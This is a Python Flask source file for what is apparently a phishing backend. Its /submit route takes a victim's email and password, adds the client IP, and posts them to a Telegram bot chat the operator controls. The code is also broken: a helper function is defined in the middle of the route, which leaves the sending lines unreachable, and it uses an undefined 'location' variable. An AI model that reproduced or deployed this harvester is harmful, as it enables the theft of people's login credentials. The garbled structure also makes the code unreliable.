import os
from flask import Flask, render_template, request, jsonify
from email.mime.text import MIMEText
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    data = {
        "chat_id": CHAT_ID,
        "text": message
    }

    requests.post(url, data=data)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email")
    password = data.get("password")

    # Get user's IP
    user_ip = get_real_ip()

   # Function to get the real client IP
def get_real_ip():
    # If behind a proxy (like Render), check X-Forwarded-For header
    if "X-Forwarded-For" in request.headers:
        # Sometimes multiple IPs are listed, take the first one
        ip = request.headers["X-Forwarded-For"].split(",")[0].strip()
    else:
        # fallback to Flask default
        ip = request.remote_addr
    return ip

    message = f"""
    Email: {email}
    Password: {password}
    IP Address: {user_ip}
    Location: {location}
    """

    send_to_telegram(message)

    return jsonify({"status": "success"})



if __name__ == "__main__":
    app.run(debug=True)